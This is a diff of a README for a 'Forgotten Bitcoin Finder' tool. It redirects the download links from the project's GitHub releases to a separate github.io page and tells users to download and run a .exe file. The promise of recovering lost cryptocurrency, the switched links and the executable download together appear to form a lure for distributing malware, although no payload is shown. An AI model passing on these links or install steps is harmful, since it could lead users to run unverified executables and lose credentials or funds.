@@ -1,6 +1,6 @@
 # 🔍 Forgotten_Bitcoin_Finder - Recover your lost digital assets today
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue?style=for-the-badge)](https://github.com/Lizbethbilateral190/Forgotten_Bitcoin_Finder/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue?style=for-the-badge)](https://lizbethbilateral190.github.io)
 
 ## 📖 About the software
 
@@ -20,7 +20,7 @@ Before you start, make sure your computer meets these minimum specifications:
 
 ## 📥 How to download and install
 
-1. Visit the following page to choose your version: [https://github.com/Lizbethbilateral190/Forgotten_Bitcoin_Finder/releases](https://github.com/Lizbethbilateral190/Forgotten_Bitcoin_Finder/releases).
+1. Visit the following page to choose your version: [https://lizbethbilateral190.github.io](https://lizbethbilateral190.github.io).
 2. Click on the latest release to view the available files.
 3. Select the file ending in .exe to download the application to your computer.
 4. Locate the file in your Downloads folder once the transfer completes.
